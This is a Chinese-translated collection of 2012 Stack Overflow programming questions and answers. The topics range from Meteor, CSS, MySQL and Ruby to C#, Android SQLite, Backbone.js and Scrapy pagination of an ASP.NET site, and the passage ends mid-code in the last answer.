> 赞同：9
> 
> 时间：2012-04-18T21:46:56.263
> 
> 标签：meteor

当数据添加到数据库时，我试图向用户显示警报。所以我写了（在客户端）：

```
Meteor.autosubscribe(function() {
  ItemCollection.find().observe({
    added: function(item) {
      // Alert code
    }
  });
}); 
```

而且我发现，当新项目添加到服务器端的数据库时，不仅会显示警报（我认为这是正常的:)），而且当我刷新页面时，还会为每个先前添加的项目显示警报。我想 Meteor 在启动时从 Mongo 数据库中获取所有数据（以填充本地 Minimongo DB），然后为本地数据库中添加的每个项目触发“添加”事件。

但这是正常的行为吗？如何仅接收“真正”添加到服务器数据库中的项目？

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2012-04-18T23:21:10.773

您正在观察客户端数据库的游标，并且该数据库可能在页面加载完成后才能完成同步，因此该行为是有意义的。您可能想要研究明确订阅一个集合，如[该问题](https://stackoverflow.com/questions/10099968/meteor-using-collection-on-client-startup)的答案中所讨论的那样。

如果您的数据有 created_at 字段，那么您可以观察页面加载后创建的项目。

```
 ItemCollection.find({created_at : {$gt: some_current_time}}).observe({
    added: function(item) {
      // Alert code
    }
  }); 
```

# html - 较粗的边框与模板

> ID：10218535
> 
> 赞同：0
> 
> 时间：2012-04-18T21:46:59.963
> 
> 标签：html, css

我以前遇到过类似的问题，并试图最终得到纠正。如果您在 js fiddle 中注意到操作 div 上方似乎有一个较厚的边框，我正在尝试找出为什么我购买的模板中有和没有。

[http://jsfiddle.net/pGFfa/](http://jsfiddle.net/pGFfa/)

模板：http://kansasoutlawwrestling.com/files/templates/admin/peachv1.2/Template/forms.html

编辑：

我用真正的预期页面更新了我的页面，但查看操作区域，左右仍然有一个边框。不知道为什么。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-18T22:00:49.833

更新了小提琴[http://jsfiddle.net/7jrEp/2/](http://jsfiddle.net/7jrEp/2/)

请注意，当您的 css 与外部链接时，您对实际 css 所做的任何更改都会更改我们发布的每个小提琴。最好将 css 粘贴到小提琴中，这样它就不会损坏。

上面提到的问题是双边框加上半径应用于表单容器的底部而不是顶部。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-18T22:03:04.497

双边框是因为内容 div 的底部边框。模板中的 div 应用了规则“.box .content.with-actions”，上面写着“border-bottom: 0 none;”。小提琴中的内容 div 没有该规则，因此它具有底部边框，并且操作 div 具有顶部边框，因此线条较粗。

不同之处在于模板中的内容 div 也有“with-actions”类，而你的 fiddle 中没有。只需添加该类，问题就会消失。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-18T21:58:33.213

在 content.css 中，尝试更改：

```
.box .content-form { border: 1px solid #C8C8C8; } 
```

至：

```
.box .content-form { border: 1px solid #C8C8C8; border-bottom: none; } 
```

# mysql - 在 2 个具有共同日期的表中聚合函数

> ID：10218537
> 
> 赞同：0
> 
> 时间：2012-04-18T21:47:09.833
> 
> 标签：mysql, aggregate-functions

我有以下 2 张桌子

```
身份证公里日期
1 22.1 2012-04-15
2 52.1 2012-04-14
3 72.1 2012-03-15
4 54.1 2012-03-14

```

和

```
身份证日期
1 16.4 2012-04-03
2 22.6 2012-04-29
3 45.9 2012-03-2
4 13.1 2012-03-31

```

从这张表中，我需要按月获得一个费率，我的意思是，公里数除以一个月内的 lt 数。我知道我可以在查询中使用聚合函数按月获得公里的总和，在其他查询中使用 lt 的总和，类似这样。

```
SELECT SUM(km) FROM kilometers GROUP BY MONTH(date)
SELECT SUM(lt) FROM gasoline GROUP BY MONTH(date) 
```

然后我可以为每个分组的月份手动划分 km/lt。所以问题是，我可以在一个简单的查询中做到这一点吗？我必须更改数据库的结构吗？

任何帮助将不胜感激，谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-18T22:00:12.107

您应该能够按月/年将表数据连接在一起。您只需要处理`lt`一个月为 0 或 null 的情况。请注意，您还需要按 YEAR 分组，以便适当地处理多年数据：

```
SELECT k.year, k.month, k.km / g.lt
FROM (SELECT YEAR(date) as year, MONTH(date) as month, SUM(km) as km
      FROM kilometers GROUP BY YEAR(date), MONTH(date)) k
JOIN (SELECT YEAR(date) as year, MONTH(date) as month, SUM(lt) as lt
      FROM gasoline GROUP BY YEAR(date), MONTH(date)) g
  ON k.month = g.month AND k.year = g.year 
```

样本输出：

```
YEAR  MONTH  K.KM / G.LT
----  -----  --------------
2012  3      2.138982929974
2012  4      1.90256407322 
```

演示：[http ://www.sqlfiddle.com/#!2/c2942/6](http://www.sqlfiddle.com/#!2/c2942/6)

# ruby - 当条件不满足时，如何让这个 2D 数组赋值不将“nil”存储在元素中？

> ID：10218541
> 
> 赞同：-1
> 
> 时间：2012-04-18T21:47:24.657
> 
> 标签：ruby

因此，我正在使用 Nokogiri 循环浏览页面上的链接列表，并将所有链接推送到 2D 数组中。问题是它正在推动`nil`一些我不想要的元素。

如何强制它跳过 nil 的元素，所以我的数组只有链接而不是一些链接和一些 nil 值？

见代码：

```
url = 'http://www.craigslist.org/about/sites'

def my_list(url)
    root = Nokogiri::HTML(open(url))
    list = root.css("a").map do |link|
        if link[:href] =~ /http/
            [link.text, link[:href]]   
        end        
    end
end 
```

想法？

PS我试过`if link[:href].nil?`了，但我不知道如何告诉它跳过那个特定的`link`元素。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-18T21:58:25.023

您可以对列表进行后处理，因为 root 似乎不支持所有收集方法，请在方法结束时尝试此操作以清理它。它会丢弃所有的零。

```
list = list.reject {|x| x.nil?} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-18T21:53:07.027

你可以试试：

```
list = root.css("a").reject!{|l| l[:href].nil?}.map do | link | 
```

# c# - 类型转换为具有相同属性的另一个

> ID：10218543
> 
> 赞同：2
> 
> 时间：2012-04-18T21:47:35.140
> 
> 标签：c#, types, casting, xsd

在我的应用程序的一个部分中，我使用从 xsd 方案生成的类型——我有 2008 和 2009 两种模式的版本——我使用的类型是 DatumType——在每个方案中，这种类型都包含相同的属性——它们是准确的，除了命名空间。有什么办法可以将 DatumType (2008) 转换为 DatumType (2009)，这样我就可以在我的应用程序中只使用一种类型，而不是两种？

我正在使用 c# 并赢得表格，谢谢！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-18T21:53:01.867

不，没有办法将一种转换为另一种，因为就编译器所知，这是两种不相关的类型。

如果目标类型的字段是可分配的，您可以编写一个使用反射来复制字段的简短方法。

您还可以构建将源类型的对象保存为 XML 并将该 XML 读入目标类型的对象的代码。这稍微脆弱一些，因为它依赖于相同字段的存在*以及*它们以相同方式转换为 XML 的事实。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-19T00:59:46.967

您可以使用更正名称空间差异的简单 XSLT 预处理您的 XML 文件。

[Identity](http://www.dpawson.co.uk/xsl/sect2/identity.html)的第 2 部分的第 1 部分解释了如何做到这一点。基本上，转换具有匹配元素并为每个匹配元素提供输出的模板。诀窍是有一个特定的模板来匹配 Datum 元素并转换它们，以及一个匹配所有类型的元素并简单地复制它们的通用转换。

如果您没有使用 XSLT 的经验，请不要害怕。它比你想象的更容易学习。您可以使用[XSLT 教程](http://www.w3schools.com/xsl/)之类的教程，它可以让您理解“身份”的解释。

您可以使用[XslCompiledTransform 类](http://msdn.microsoft.com/en-us/library/system.xml.xsl.xslcompiledtransform.aspx)来应用转换。

您可以[使用 Visual Studio 测试和调试 XSLT](http://msdn.microsoft.com/en-us/library/ms255605%28v=vs.80%29.aspx)文件。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-18T21:54:46.747

在我看来，最简单的做法是构建一个小方法来将一种类型转换为另一种类型（因为它们都共享属性），或者，如果您可以访问源代码，则实现一个接口，以便您可以使用两个类作为该接口。

换句话说，如果我们有两个类，B 和 C，它们继承接口 A（它包含我们感兴趣的所有属性），我们可以将这两个类的任何对象类型转换为 A。

# java - 使用 org.apache.http.entity.StringEntity 显然出现奇怪的编译错误。两个不同项目中的不同行为

> ID：10218550
> 
> 赞同：1
> 
> 时间：2012-04-18T21:48:12.643
> 
> 标签：java, android

我将在 Eclipse Java 项目中运行良好的代码复制到了 Android 项目中，即使我导入了相同的 .jar，我在 Android 项目中也遇到了编译错误。

在 Android 项目中，Eclipse 在以下行中显示错误“ *The constructor StringEntity(String, String, String) is undefined* ”：

```
StringEntity se = new StringEntity("example data.", "application/json", "UTF-8"); 
```

但在另一个 Java 项目中，它编译并运行良好。[文档](http://hc.apache.org/httpcomponents-core-ga/httpcore/apidocs/org/apache/http/entity/StringEntity.html)说构造函数确实`StringEntity(String string, String mimeType, String charset)`存在。

我`org.apache.http.entity.StringEntity`在两个项目中导入相同的内容。Eclipse 项目中使用的 jar 与 Android 项目中使用的 jar 相同。我什至复制并粘贴了它们。我也清理了项目。仍然没有成功。谁能向我解释为什么会发生这个错误？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-18T22:09:45.583

Android 不使用最新版本的 HttpClient 4.x。

[Android 版本`StringEntity`](http://developer.android.com/reference/org/apache/http/entity/StringEntity.html)目前只有这些构造函数：

*   `StringEntity(String s, String charset)`
*   `StringEntity(String s)`

我假设 Android SDK 类优先于您作为 JAR 提供的相同类。我会删除 JAR 以避免将来出现这种混淆——拥有相同类的不同版本对任何人都没有好处。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-18T21:49:54.967

您的项目很可能使用不同版本的 Apache Http 组件。该库已集成到 Android 中，并且很少是最新发布的版本。您当前使用的实际版本将取决于您使用的 Android 版本。

# methods - 计算离散周期数据的导数

> ID：10218559
> 
> 赞同：1
> 
> 时间：2012-04-18T21:48:58.393
> 
> 标签：methods, derivative, spectral

我有一个数组 y[x], x=0,1,2,...,10^6，用 y(10^6)=y(0) 描述周期信号，我想计算它的导数 dy/ dx 用一个快速的方法。

我尝试了光谱差分法，即

dy/dx = inverse_fourier_transform ( i*kfourier_transform(y)[k] ) ....(1)

并且结果与 (y[x+1]-y[x-1])/2 不同，即由有限差分法建议。

两者哪个更准确，哪个更快？还有其他类似的方法吗？

以下是理解结果差异的努力：

如果将 (1) 中的fourier_transform 和inverse_fourier_transform 的总和展开，则可以将dy/dx 表示为y[x] 与系数a[x] 的线性组合。我计算了这些系数，它们似乎是 1/n（当数组的长度变为无穷大时），n 是到检查导数的距离。与仅使用两个相邻点的有限差分方法相比，**光谱差异是高度非局部的**……我对这个结果是否正确，如果是，如何理解？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-18T21:53:59.160

如果您对高于奈奎斯特频率的信号进行采样，则傅立叶方法会给您一个准确的答案，因为您的数据完全描述了信号（假设没有噪声）。

有限差分法是一阶近似，因此并不精确。但是，如果您绘制两者，它们应该显示相同的基本趋势。如果它们看起来完全不同，那么您可能在某处有错误。

然而，一个快速的 ft 是 O(nlog(n)) 而有限差分是 O(n) 所以后者更快（但不是快到应该自动首选）。

傅立叶方法是非局部的，因为它准确地构建了整个信号（因此使用了所有波长）。

# android - 更新数据库表的正确技术是什么

> ID：10218560
> 
> 赞同：0
> 
> 时间：2012-04-18T21:49:05.497
> 
> 标签：android, database, sqlite

在我的代码中，我有如下两个数据库更新。我的大多数更新在更新记录之前首先打开数据库，然后在更新记录后关闭数据库。我注意到不使用此语句： mDb = Helper.getWritableDatabase(); 在插入和此语句之前： mDb.close(); 插入后，有时会导致强制关闭错误，但并非总是如此。什么是正确的方法。我是一直使用 open 和 close 语句，还是仅在必须或应该在更新过程中始终打开然后关闭时使用。什么是正确的技术。这是带有打开关闭语句的片段。提前致谢。公开声明是否必要？

```
 // Open connections to the database
            mDb = Helper.getWritableDatabase();             

            // update 1
            String strFilter7 = "_id=" + 7;
            ContentValues args7 = new ContentValues();
            args7.put(COL_VALUE, newB1ftgvalue);
            mDb.update("VarData", args7, strFilter7, null);

             // update 2
            String strFilter11 = "_id=" + 11;
            ContentValues args11 = new ContentValues();
            args11.put(COL_VALUE, newB2ftgvalue);
            mDb.update("VarData", args11, strFilter11, null);

            // closes database
            mDb.close(); 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-18T22:06:44.960

不要关闭它，并且只有一个 sqlite 助手。它基本上是一个静态的openhelper。从不关闭数据库没有问题。该链接提供了一段很好的代码，效果很好。使用打开的数据库不会出现内存泄漏。但是，您将遇到打开游标的问题，因此请确保关闭它们。

[http://www.touchlab.co/blog/single-sqlite-connection/](http://www.touchlab.co/blog/single-sqlite-connection/)

这里有一个很好的讨论： [Android 上 SQLite 的最佳实践是什么？](https://stackoverflow.com/questions/2493331/what-is-best-practice-with-sqlite-and-android/2493839)

我意识到我发布的链接自从我第一次查看它时就发生了变化。改变：

```
instance = new DatabaseHelper(context); 
```

至

```
instance = new DatabaseHelper(context.getApplicationContext()); 
```

和

```
public class DatabaseHelper extends OrmLiteSqliteOpenHelper 
```

至

```
public class DatabaseHelper extends SqliteOpenHelper 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-18T21:51:28.930

完成数据库更新后始终调用 close() 是一种很好的做法。如果您尚未关闭数据库，您可能会看到错误。数据库打开后，您可以进行多次更新。这不应该是一个问题。需要注意的一件事是，由于很多原因，最好不要长时间保持打开连接。这是关于这个主题的很好的[讨论。](https://stackoverflow.com/questions/4842112/when-to-close-db-connection-on-android-every-time-after-your-operation-finished)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-18T22:22:36.200

您需要将数据库作为可写数据库打开才能修改其数据，所以是的，您必须在更新记录之前打开它。

# c# - C# 按位加法和减法，就像在 C 中一样

> ID：10218570
> 
> 赞同：1
> 
> 时间：2012-04-18T21:49:56.490
> 
> 标签：c#, binary, bit-manipulation

我正在编写一个 QuadTree 类，我需要包括邻居搜索。我正在关注包括 C 实现的[这篇论文。](http://www.merl.com/papers/docs/TR2002-41.pdf)（我基本上是将其转换为 C#。）而且我遇到了麻烦，因为我不太擅长处理二进制数。我需要做以下事情：

给定#100 和#010，将它们组合得到#110。1s 永远不会重叠。现在我所做的是存储 100 和 10，当我添加它们时，它给了我 110。

对 #011 等数字执行左右二进制移位。现在我正在存储 011 并对其应用 >> 或 << 运算符。这给了我一个完全错误的数字，但奇怪的是，我用它来寻找常见的四叉树父母的逻辑工作得很好。

给定#011 和#001 将它们相加得到#100。现在我正在存储 11 和 1，这显然根本不起作用。

执行按位减法，与上面相同，但 - 而不是 + :)

执行 AND、OR 和 XOR。

因此，现在我将所有内容存储为看起来像二进制值的整数，并且数学似乎适用于 AND、OR、XOR 和移位。中间的数字很疯狂，但我最终得到了正确的答案。

我现在正在尝试一个实现，我存储整数值，它是二进制数的值，但我必须来回转换很多，这特别痛苦，因为我在值的整数表示之间进行转换数字和二进制数本身的字符串表示形式。每隔一行代码创建一个新字符串将是一场性能噩梦。

你们能推荐一个在 C# 中处理二进制数的基本策略吗？

PS我不需要看到这些数字的整数表示。我真的不在乎#010 == 2，我需要做的工作将其视为#010 故事的结尾。

希望这比我原来的帖子更清楚！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-18T22:55:15.387

我希望这会消除一些混乱：

*   文字`0x00000001`使用十六进制表示法表示 1。
*   文字`1`使用十进制表示法表示 1。

下面是一些对等的字面量：

```
 0x9 ==  9
 0xA == 10
 0xF == 15
0x10 == 16
0x11 == 17
0x1F == 31 
```

原始整数数据类型（byte、sbyte、ushort、short、char、uint、int、ulong、long）*始终以二进制格式存储在计算机内存中。* 以下是用五位表示的上述值：

```
 1 == #00001
 9 == #01001
10 == #01010
15 == #01111
16 == #10000
17 == #10001
31 == #11111 
```

现在，考虑：

```
unsigned int xLeftLocCode = xLocCode - 0x00000001; 
```

以下任一项在 C# 中是等价的：

```
uint xLeftLocCode = xLocCode - 1;
uint xLeftLocCode = xLocCode - 0x00000001; 
```

要将二进制文件分配给`#10`uint 变量，请执行以下操作：

```
uint binaryOneZero = 2;   //or 0x2 
```

十六进制表示法对位操作很有用，因为十六进制和二进制数字之间存在一对一的对应关系。更准确地说，存在一对四的对应关系，因为 16 个十六进制数字中的每一个都代表 4 位的 16 种可能状态之一：

```
0 ==  0 == 0000
1 ==  1 == 0001
2 ==  2 == 0010
3 ==  3 == 0011
4 ==  4 == 0100
5 ==  5 == 0101
6 ==  6 == 0110
7 ==  7 == 0111
8 ==  8 == 1000
9 ==  9 == 1001
A == 10 == 1010
B == 11 == 1011
C == 12 == 1100
D == 13 == 1101
E == 14 == 1110
F == 15 == 1111 
```

因此很容易知道`0x700FF`，例如，具有最低有效字节集的所有位，没有下一个最高有效字节，以及下一个最高有效字节的低三位。`459007`如果您使用文字来表示该值，则很难一目了然地看到该信息。

综上所述：

> 你们能推荐一个在 C# 中处理二进制数的基本策略吗？

学习上表，并使用十六进制文字。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-18T21:57:57.617

> 为什么那条感兴趣的行在 C 中进行按位减法，但在 C# 中进行整数减法。

他们都应该这样做。为什么你不这么认为？你对按位减法是什么意思？

> 我将二进制数 10 存储为整数 10，而不是整数 2。我可能做错了。

是的，那是错误的。#010 == 2，而不是 10。

> 我想我要寻找的是在 C# 中处理二进制数的一些基本策略。

总的来说，这些操作应该与 C 中的相同。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-18T22:00:24.497

您标记的行与按位无关。它是数字 1 的直接减法（表示为十六进制双字 (DWORD) 或无符号长整数（C# 中的 uint）。

# jquery - 带有当前/总幻灯片的 jQuery 循环分页

> ID：10218572
> 
> 赞同：3
> 
> 时间：2012-04-18T21:50:13.047
> 
> 标签：jquery, cycle, jquery-cycle, pager

我想构建一个 jQuery Cycle 幻灯片，分页格式为“current_slide/total_slides”，如此[处所示](http://diary.chopard.com/precious-temptations-bejewelled-treats)

我假设我会使用 pageAnchorBuilder 显示当前和总幻灯片编号，然后使用 onAfter 更新当前幻灯片编号？

有人能帮忙吗？谢谢！

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-04-18T22:13:56.047

我推荐使用 jQuery Cycle 插件。假设幻灯片是一个有序列表：

```
<ol class="slides">
    <li class="slide">...</li>
    ...
</ol>
<a id="prev"></a><span id="counter">1 / 1</span><a id="next"></a> 
```

您可以通过调用获取幻灯片总数：

```
var total = $('.slides').children().length; 
```

然后我们需要在幻灯片更改后更新计数器：

```
$('.slides').cycle({
    after(el) {
        const currentSlideNo = $(el).index();
        $('#counter').text(currentSlideNo + ' / ' + total);
    },
    prev: $('#prev'),
    next: $('#next'),
}); 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-05-06T19:25:04.430

无需计算总数和幻灯片索引，因为 jquery 循环插件已经在 after 事件中将它们返回给您。

```
 after: function(currSlideElement, nextSlideElement, options, forwardFlag) {

    $('#counter').text((options.currSlide + 1) + '/' + (options.slideCount));
 } 
```

这是一个jsfidde：http: [//jsfiddle.net/lucuma/Dhqdc/2/](http://jsfiddle.net/lucuma/Dhqdc/2/)

# php - 内部服务器错误 500，运行 Yii 内存不足错误

> ID：10218575
> 
> 赞同：2
> 
> 时间：2012-04-18T21:50:17.327
> 
> 标签：php, yii

所以我正在运行 Yii，它有一个管理一些科学数据的应用程序。

我在 CentOS 上运行 Apache。

PHP 版本 5.2.10 Apache/2.2.3 (CentOS)

这是我的错误日志（混淆的个人识别信息）。

```
[Wed Apr 18 15:27:42 2012] [error] [client 000.000.000.000] PHP Notice:  Use of undefined constant \x94512M\x93 - assumed '\x94512M\x93' in /var/www/MySite/www/admin/index.php on line 12, referer: http://MySite.com/admin/index.php?r=factsheet/admin
[Wed Apr 18 15:27:44 2012] [error] [client 000.000.000.000] PHP Fatal error:  Allowed memory size of 134217728 bytes exhausted (tried to allocate 57 bytes) in /var/www/MySite/www/yii/framework/db/ar/CActiveRecord.php on line 1856, referer: http://MySite.com/admin/index.php?r=factsheet/admin 
```

如果我将 renderPartial() 从我的视图中删除，我可以加载页面，所以它似乎以某种方式与之相关。

CActiveRecord.php：

```
protected function instantiate($attributes)
{
    $class=get_class($this);
    $model=new $class(null);
    return $model;
} 
```

我的模型：

```
Extends an abstract class which extends GxActiveRecord. 
```

看法：

```
<?php

$this->breadcrumbs = array(
    $model->label(2) => array('index'),
    Yii::t('app', 'Create'),
);
$this->menu = array(
    array('label'=>Yii::t('app', 'List') . ' ' . $model->label(2), 'url' => array('index')),
    array('label'=>Yii::t('app', 'Manage') . ' ' . $model->label(2), 'url' => array('admin')),
);
?>
<h1><?php echo Yii::t('app', 'Create') . ' ' . GxHtml::encode($model->label()); ?></h1>
<?php
$this->renderPartial('_form', array(
        'model' => $model,
        'buttons' => 'create'));
?> 
```

index.php 的第 12 行

```
ini_set(“memory_limit”,”512M“); 
```

有任何想法吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-18T21:53:01.413

讯息

```
[Wed Apr 18 15:27:42 2012] [error] [client 000.000.000.000] PHP Notice:  Use of undefined constant \x94512M\x93 - assumed '\x94512M\x93' in /var/www/MySite/www/admin/index.php on line 12, referer: http://MySite.com/admin/index.php?r=factsheet/admin 
```

表示您错过了变量前的 $ 符号。

请提供 index.php 的第 12 行。我不相信问题出在上面提供的来源中。

讯息

```
[Wed Apr 18 15:27:44 2012] [error] [client 000.000.000.000] PHP Fatal error:  Allowed memory size of 134217728 bytes exhausted (tried to allocate 57 bytes) in /var/www/MySite/www/yii/framework/db/ar/CActiveRecord.php on line 1856, referer: http://MySite.com/admin/index.php?r=factsheet/admin 
```

经常表示某个循环的 PHP 操作或复杂的查询。

您可以增加 PHP 内存的数量，但这很可能不会解决实际问题。

# java - 抽象类 - 扩展类和 DAO

> ID：10218576
> 
> 赞同：1
> 
> 时间：2012-04-18T21:50:21.153
> 
> 标签：java, mysql, dao

我有一个抽象类 User 和 3 个从这个类扩展的类（Admin、Modurator、Lector）。

在我的数据库中，我有一个表用户，其中包含所需的数据（用户名/密码/Security_lvl）。

我使用 DAO 连接到用户的数据库。

```
public class MysqlUserDao implements UserDao {
    //
    private static MysqlUserDao instance;

    //
    public static MysqlUserDao getInstance() {
        if (instance == null)
            instance = new MysqlUserDao();
        return instance;
    }
public void create(User user) {
        try {
            c = MySqlDAOFactory.getInstance().getConnection();
            //
            String sql = "insert into user values (?,?,?)";
            //
            prest = c.prepareStatement(sql);
            //
            prest.setString(1, user.getUserName());
            prest.setString(2, user.getPassword());
            prest.setInt(3, user.getRole().returnSecurityLevel());
            //
            prest.executeUpdate();
            //
        } catch (SQLException e) {
            JdbcLogging.info("error item" + " :"
                    + e);
        } finally {
            MySqlConnectionFactory.getInstance().closeResultSet(rs);
            MySqlConnectionFactory.getInstance().closeStatement(prest);
            MySqlConnectionFactory.getInstance().closeConnection(c);
        }
    } 
```

}

在 java 中，根据用户类型，我创建了特定的 Admin、Modurator 或 Lector 对象，以便我可以使用它们的特定方法。

现在我遇到的问题是我需要这个 DAO 的用户。但是 User 是抽象的，我不制作任何 User 对象。我可以为每个其他类制作三个不同的 DAO，但它们会做同样的事情。有没有一种干净的方法可以做到这一点......

他们也许是一个简单的解决方案，但我只是没有看到它。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-18T21:59:24.437

您可以将 Admin、Moderator 或 Lector 实例作为参数传递给您的`create`方法。[Java 中的多态](http://docs.oracle.com/javase/tutorial/java/IandI/polymorphism.html)允许这种行为。

# model - Backbone JS：如何禁用同步删除？

> ID：10218578
> 
> 赞同：20
> 
> 时间：2012-04-18T21:50:24.927
> 
> 标签：model, backbone.js, destroy

我正在处理一个线程化的评论集合，当我删除一个有子评论的评论时，我会`model.destroy()`为这个评论做这个，并且在服务器端它的所有分支都被删除。

我编写了一个函数，一旦从树中删除节点，就会查找所有孤立节点并将它们也删除。因此，当我找到孤儿时，我`model.destroy()`也会在它们上运行，但因为它们已经在服务器上被删除，同步会返回错误。

有没有办法禁用某些`destroy()`呼叫的同步？

* * *

## 回答 #1

> 赞同：32
> 
> 时间：2012-04-18T22:27:23.883

由于该`destroy`方法所做的只是发送一个 DELETE 请求和 triggers `destroy`，因此简单地触发`destroy` **正是**您要寻找的。

```
model.trigger('destroy', model, model.collection, options); 
```

是的，感觉有点骇人听闻，但这几乎就是 Backbone 代码所做的所有事情。如果你愿意，并且如果你有一个你扩展的基本模型，你可以将它作为一个方法添加到那个基本模型上，它可能不会让人觉得很老套。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-06-01T02:57:21.203

这有点晚了，但可以作为其他有同样问题的人的替代解决方案。

面对一个非常相似的问题，我最终`null`在调用`destroy`它们之前将所有子 ID 设置为。这样，骨干网认为它们是*新*的，并且在删除时不会`DELETE`向服务器产生 HTTP 请求。

```
deleteParent: function() {
  this.model.children.each(function(child) {
    // Set to null so that it doesn't try to spawn a 'DELETE' http request 
    // on 'destroy' since thinks its new (hack).
    child.id = null; 
    child.destroy();
  });
  // This one DOES result in a 'DELETE' http request since it has an ID.
  this.model.destroy();
}, 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2015-05-15T16:03:11.833

这允许您尊重销毁调用，包括任何成功处理程序

```
Backbone.Model.extend({
    destroy: function (options) {
       // don't make a server call, just delete from collection and call success
       this.trigger('destroy', this, this.collection, options);
       if (options && options.success) {
              options.success();
       }
    }
}); 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-11-04T05:58:24.070

遇到同样的问题。

使用模型到其包含集合的链接从该集合中删除模型是我的首选解决方案，因为这正是我想要做的并且在代码中非常清楚：

```
// From the view
this.model.collection.remove(this.model); 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2015-05-03T14:22:55.273

基于 fcarriedo 的回答，只需覆盖模型声明中的 destroy 方法：

```
Models.YourModelName = Backbone.Model.extend({
    destroy: function () {
        this.id = null;
        Backbone.Model.prototype.destroy.apply(this, arguments);
    }
}); 
```

# algorithm - 从有序列表中插入和删除元素的时间复杂度

> ID：10218580
> 
> 赞同：0
> 
> 时间：2012-04-18T21:50:39.287
> 
> 标签：algorithm, data-structures, complexity-theory

这两个操作的时间复杂度是否等于 O(log n)？记住：列表是有序的，总是有序的，而不是双重链接的。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-04-18T21:54:30.930

有序链表中的插入和删除都是**`O(n)`**-因为您首先**需要找到要删除/添加**的内容[在删除中找到相关节点，并在插入中-找到它的正确位置]-即`O(n)`-即使list 是有序的，因为您需要在从头部迭代时到达这个地方。

一种允许快速插入、删除和查找的高效特殊类型列表称为[跳过列表](http://en.wikipedia.org/wiki/Skip_list)，它使用更多节点在非相邻节点之间快速迭代

# python - 使用 scrapy 抓取带有 javascript 按钮和 ajax 请求的 asp.net 网站

> ID：10218581
> 
> 赞同：4
> 
> 时间：2012-04-18T21:50:39.310
> 
> 标签：python, postback, web-scraping, scrapy

我一直试图从 asp.net 网站上抓取一些日期，起始页应该是以下一个： [http ://www.e3050.com/Items.aspx?cat=SON](http://www.e3050.com/Items.aspx?cat=SON)

首先，我想每页显示 50 个项目（来自 select 元素）其次，我想通过页面进行分页。

我为每页 50 个项目尝试了以下代码，但没有奏效：

```
start_urls = ["http://www.e3050.com/Items.aspx?cat=SON"]    
def parse(self, response):
        requests = []
        hxs = HtmlXPathSelector(response)

        # Check if there's more than 1 page         
        if len(hxs.select('//span[@id="ctl00_ctl00_ContentPlaceHolder1_ItemListPlaceHolder_lbl_PageSize"]/text()').extract()) > 0:
            # Get last page number
            last_page = hxs.select('//span[@id="ctl00_ctl00_ContentPlaceHolder1_ItemListPlaceHolder_lbl_PageSize"]/text()').extract()[0]
            i = 1

            # preparing requests for each page
            while i < (int(last_page) / 5)  + 1:
                requests.append(Request("http://www.e3050.com/Items.aspx?cat=SON", callback=self.parse_product))
                i +=1 

            # posting form date (50 items and next page button)
            requests.append(FormRequest.from_response(
                    response,
                    formdata={'ctl00$ctl00$ContentPlaceHolder1$ItemListPlaceHolder$pagesddl':'50',
                              '__EVENTTARGET':'ctl00$ctl00$ContentPlaceHolder1$ItemListPlaceHolder$pager1$ctl00$ctl01'},
                    callback=self.parse_product,
                    dont_click=True
                )
            )

            for request in requests:
                yield request 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-04-20T13:39:29.830

看看这里是一个确切的解决方案..

在解析方法中，每页选择 50 个产品

在 page_rs_50 处理分页

```
start_urls = ['http://www.e3050.com/Items.aspx?cat=SON']
pro_urls = [] # all product Urls

def parse(self, response): # select 50 products on each page
    yield FormRequest.from_response(response,
        formdata={'ctl00$ctl00$ContentPlaceHolder1$ItemListPlaceHolder$pagesddl': '50',
                  'ctl00$ctl00$ContentPlaceHolder1$ItemListPlaceHolder$sortddl': 'Price(ASC)'},
        meta={'curr': 1, 'total': 0, 'flag': True},
        dont_click=True,
        callback=self.page_rs_50)

def page_rs_50(self, response): # paginate the pages
    hxs = HtmlXPathSelector(response)
    curr = int(response.request.meta['curr'])
    total = int(response.request.meta['total'])
    flag = response.request.meta['flag']
    self.pro_urls.extend(hxs.select(
        "//td[@class='name']//a[contains(@id,'ctl00_ctl00_ContentPlaceHolder1_ItemListPlaceHolder_itemslv_ctrl')]/@href"
    ).extract())
    if flag:
        total = hxs.select(
            "//span[@id='ctl00_ctl00_ContentPlaceHolder1_ItemListPlaceHolder_lbl_pagesizeBtm']/text()").re('\d+')[0]
    if curr < total:
        curr += 1
        yield FormRequest.from_response(response,
            formdata={'ctl00$ctl00$ContentPlaceHolder1$ItemListPlaceHolder$pagesddl': '50',
                      'ctl00$ctl00$ContentPlaceHolder1$ItemListPlaceHolder$sortddl': 'Price(ASC)',
                      'ctl00$ctl00$ScriptManager1': 'ctl00$ctl00$ScriptManager1|ctl00$ctl00$ContentPlaceHolder1$ItemListPlaceHolder$pager1$ctl00$ctl01'
